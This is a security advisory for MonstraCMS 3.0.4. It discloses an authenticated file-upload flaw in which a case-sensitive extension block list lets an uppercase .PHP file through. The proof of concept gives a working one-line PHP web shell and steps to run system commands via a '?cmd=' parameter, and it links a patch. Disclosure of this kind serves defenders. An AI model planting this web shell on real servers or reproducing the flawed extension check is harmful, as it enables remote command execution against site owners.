Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array(&#039;html&#039;, &#039;htm&#039;, &#039;js&#039;, &#039;jsb&#039;, &#039;mhtml&#039;, &#039;mht&#039;,
                                 &#039;php&#039;, &#039;phtml&#039;, &#039;php3&#039;, &#039;php4&#039;, &#039;php5&#039;,
&#039;phps&#039;,
                                 &#039;shtml&#039;, &#039;jhtml&#039;, &#039;pl&#039;, &#039;py&#039;, &#039;cgi&#039;, &#039;sh&#039;,
&#039;ksh&#039;, &#039;bsh&#039;, &#039;c&#039;, &#039;htaccess&#039;, &#039;htpasswd&#039;,
                                 &#039;exe&#039;, &#039;scr&#039;, &#039;dll&#039;, &#039;msi&#039;, &#039;vbs&#039;, &#039;bat&#039;,
&#039;com&#039;, &#039;pif&#039;, &#039;cmd&#039;, &#039;vxd&#039;, &#039;cpl&#039;, &#039;empty&#039;);

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Dropdown menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code:

           <?php

 $cmd=$_GET[&#039;cmd&#039;];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.


Recommended Patch:
We were not able to get the vendor to respond in any way, the software
appears to have been left abandoned without support a though this is not an
official status on their site (last official patch was released on
2012-11-29), the github appears a bit more active (last commit from 2 years
ago).

The patch that addresses this bug is available here:
 https://github.com/monstra-cms/monstra/issues/426

-- 
Best Regards,
Ishaq Mohammed
https://about.me/security-prince

